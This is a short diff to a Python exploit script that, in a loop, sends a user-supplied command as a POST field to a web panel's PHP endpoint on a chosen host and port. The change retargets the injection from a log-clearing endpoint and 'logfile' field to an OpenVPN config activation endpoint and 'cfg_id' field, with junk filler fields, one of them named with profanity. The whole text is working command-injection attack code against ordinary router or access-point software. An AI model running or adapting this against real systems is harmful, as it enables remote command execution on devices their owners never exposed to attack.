@@ -19,7 +19,7 @@ else:
     target_port = sys.argv[2]
     
 
-    endpoint = "ajax/logging/clearlog.php"
+    endpoint = "ajax/openvpn/activate_ovpncfg.php"
     url = "http://{}:{}/{}".format(target_host,target_port,endpoint)
 
     while(True):
@@ -28,7 +28,7 @@ else:
         s = requests.Session()
         post_data = {
             "idk" : "b %$##",
-            "logfile": command,
+            "cfg_id": command,
             "fuck": "%$$% &*^$*&^$*",
             "a" : "^$ d"
         }
